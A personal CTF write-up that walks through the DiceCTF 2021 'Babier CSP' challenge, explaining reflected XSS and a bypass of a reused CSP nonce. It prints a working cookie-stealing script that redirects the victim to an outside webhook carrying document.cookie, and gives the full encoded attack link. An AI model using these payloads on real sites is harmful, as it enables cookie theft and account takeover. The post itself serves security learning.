

##
#
https://0x0elliot.medium.com/babier-csp-a-great-beginner-xss-challenge-c8b431c03385
#
https://github.com/0x0elliot/XSS-CTF-With-Python
#
##



From DiceCTF 2021

I had some time this weekend so i decided to play DiceCTF 2021. Babier CSP was a CTF i encountered. On first look, it’s your average XSS challenge with an addition of checking the nonce. Don’t let the word “nonce” scare you. I will try my best to simplify this challenge for you.

The challenge:


This is how the website looked like:


ignore my bookmarks
On first look, it’s clear that the parameter “name” in the link has the potential to inject some good old unfiltered input into it.


again, ignore my bookmarks
Now, Let’s try to see if we can inject HTML through this input.


you know what i am about to say
As you can see, I tried <u>pp</u>

The underline under “pp” verifies that indeed we can inject html into this page. (u html tag is used for underlining). Great, now let’s try to inject some javascript into this page using the <script> tag.

I will use the payload </h1><script>alert(1)</script><!-- to see if i am able to get an alert box to pop up to verify that indeed we are able to inject and successfully execute javascript as well. I used the </h1> tag to close the h1 tag before it and <!-- is just to comment whatever comes after so that i don’t have to worry about whatever is after it. In HTML to close the comment we need to use --> but HTML is smart enough to automatically make up for it.

Injecting malicious javascript code into a web page is termed as “Cross Site Scripting” often called “XSS”. You can pretty much make a user’s browser execute any function and it will seem like they executed it. This way, you can even steal their cookies and thus take over their account. That is of course, if the target website is vulnerable to XSS. You can learn more about it here.


The source code before i added my payload

The source code after I added my payload
Alright great. From the source code we can confirm that the script tags have been successfully injected. But upon loading i didn’t see the expected alert pop-up. Instead i was greeted with something like this:


That’s a blank page sir.
A blank page. Weird. I mean, we injected everything successfully as seen in the source code. The name of the challenge is babier CSP not babier XSS after all. So let’s look for some explanation in the console.


I just right clicked, Clicked on inspect element and now would click on console for the console.

Alright so we see some errors here. The console is where you go as a developer when your Javascript doesn’t work. It has the errors there. Since we injected some javascript which failed to work, we will look at it to see why exactly it didn’t work.

Refused to execute inline script because it violates the following Content Security Policy directive: “script-src ‘nonce-LRGWAXOY98Es0zz0QOVmag==’”. Either the ‘unsafe-inline’ keyword, a hash (‘sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=’), or a nonce (‘nonce-…’) is required to enable inline execution.

This error basically means that due to the Content Security Policy (CSP, heh. Get why it’s babier CSP?) We can’t get the javascript in the code to work without using the right “nonce”.

A nonce is a hash, ie random string of characters that is supposed to be used just once. It’s used by the back-end and the Content Security Policy to verify that the javascript that’s going to run in the script tags is from a trusted source. If we go back to the original page, there is some javascript there which was intended to be there. Notice how there is a nonce attribute attached to the tag with it being equal to a sequence of weird characters. Yeah so that’s the “hash” that’s been verified by the back-end. It’s supposed to be only used once.

Now the vulnerability in this CTF is that the nonce itself isn’t being used once. You can verify by reloading the page and noticing how the nonce attribute always has the same value [LRGWAXOY98Es0zz0QOVmag==] EVERY time you reload the page.

Nice. We can further verify this by going through the provided app.js file


Don’t get scared if node js feels alien to you. It feels the same way to me :)
Notice how in the back-end code the NONCE constant is generated just once. Great, now we know that the nonce will always remain constant. So let’s just throw the nonce attribute in and see if it works. [Remember that the javascript that runs on your browser and the node js used to write the back end of this website are two different things. node js is javascript as well but an extension of it that you can run through your terminal. It is used to work on back-ends stuff. The javascript on your browser on the other hand can be only utilised to write front-end stuff. That is again, me simplifying things.]


BOI

Now that we are able to execute whatever javascript we want, Let’s proceed to clap some admin bot’s cheeks. That is, stealing their cookies.

The form of XSS that we are using is called Reflected XSS. You can learn about types of XSS here.

In reflected XSS, you can send a link to the victim and the link itself contains the payload that gets executed. For example, https://babier-csp.dicec.tf/?name=%3C/h1%3E%3Cscript%20nonce=LRGWAXOY98Es0zz0QOVmag==%3Ealert(1)%3C/script%3E%3C!-- how this link itself has our payload and it’s not stored anywhere. It gets executed because it reflects the parameters in the link.

Anyway, back to stealing cookies and clapping some cheeks.

Usually you need a server to steal cookies with XSS but https://requestbin.com/ makes your life so much easier by assigning you an endpoint you can send requests to and see the request details.

Using that site, I generated a random webhook.

```
<script>
document.location= "https://envn9mg1xs9204g.m.pipedream.net/?cookie=" + document.cookie
</script>
```

This payload basically redirects the victim’s browser to your webhook’s link and sends the parameter “cookie” with the value of the victim’s cookie.

So the payload link ends up being:

https://babier-csp.dicec.tf/?name=%3C/h1%3E%3Cscript%20nonce=LRGWAXOY98Es0zz0QOVmag==%3E%20document.location=%20%22https://envn9mg1xs9204g.m.pipedream.net/?cookie=%22%20%2B%20document.cookie%20%3C/script%3E

Great. Also heads up, remember that links have their respective encoding. If things screw up, Just replace the “+” you used in the code with “%2B” like i did or it will be considered a space instead.

I verified that the link works. Now it’s time to send it to the bot.


And now let’s check the latest request sent to our webhook.


Great! We have the cookie as secret=4b36b1b8e47f761263796b1defd80745

Now this part doesn’t really make sense but it’s fine.


Again referencing back to index.js provided to us, We can see that there is a secret endpoint which is basically the value of the cookie.


oh yeah! i think we are close boys.



And that’s the flag! What a sweet little CTF :D. Also Ps Adult CSP didn’t even have a website it was a pwn challenge. I was too lazy to try anything else so i didn’t. I have a school to manage guys don’t blame me.

Bonus


Remember this screenshot from a bit up? So favicon.ico is fetched by default by your browser. It shows an error due to the CSP because it is set to default-src-none


So this is some hardcore filtering. The website can’t fetch an image until and unless it’s pretty much whitelisted. That is why that other error came. It wasn’t whitelisted yet your browser tries to fetch it by default and that makes the CSP go “no go off i don’t trust this random file it’s not been whitelisted”.

If you liked the article, then feel free to follow me on twitter here. Feel free to drop some feedback there as well. Be kind while giving the feedback :>
I also run a community of hackers on discord. Here is the invite link to it: https://discord.gg/hyrSjqWXyH
Feel free to drop by to hangout, learn and contribute :D
We also have our lil CTFs there with a public leaderboard where you can learn new things and practice your skills.

Hacking
Xss
Web
Ctf
